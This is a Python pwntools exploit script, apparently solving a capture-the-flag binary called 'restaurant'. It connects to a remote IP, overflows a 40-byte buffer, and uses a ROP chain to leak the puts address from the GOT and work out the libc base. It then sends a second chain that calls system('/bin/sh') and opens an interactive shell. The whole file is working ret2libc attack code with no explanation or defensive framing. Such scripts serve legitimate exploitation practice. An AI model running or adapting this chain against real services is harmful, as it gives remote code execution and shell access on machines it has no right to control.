#!/bin/python

from pwn import *
import time 

context.clear(arch="amd64")

host = "138.68.189.41"
port = 31280

elf = ELF("./restaurant")
p = elf.process()
p = remote('159.65.24.118', '31340')
offset = 40 # manual discovery

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
fill_plt = elf.symbols['fill']

libc = ELF("libc.so.6")
rop = ROP(elf)

rop.call((rop.find_gadget(["ret"]))[0])						# align the stack
rop.call(elf.plt["puts"], [next(elf.search("\n\x00"))])
rop.call(elf.plt["puts"], [elf.got["puts"]])
rop.call(elf.symbols["fill"])

payload  = "A"*offset
payload += rop.chain()

p.recvuntil("> ")
log.progress("Sending menu choice (1)...")
p.sendline("1") 			# choosing first option

p.recvuntil("> ")
log.progress("Sending leak payload...")
p.sendline(payload)
time.sleep(0.5)

log.progress("Receiving junk ...")
print(p.recvline())
print(p.recvline())
print(p.recvline())

log.success("Leak received !")
leak = u64(p.recvuntil("\n").strip().ljust(8, "\x00"))

log.info("Puts leaked address @ {}".format(hex(leak)))

libc.address = leak - libc.symbols["puts"]

rop = ROP(libc)

rop.call(rop.find_gadget(["ret"]))
rop.call(libc.symbols["system"], [next(libc.search("/bin/sh\x00"))])

payload  = "A"*offset
payload += rop.chain()

p.clean()

log.progress("Sending second payload...")
p.sendline(payload)
time.sleep(0.5)

log.critical("Going interactive")
p.interactive()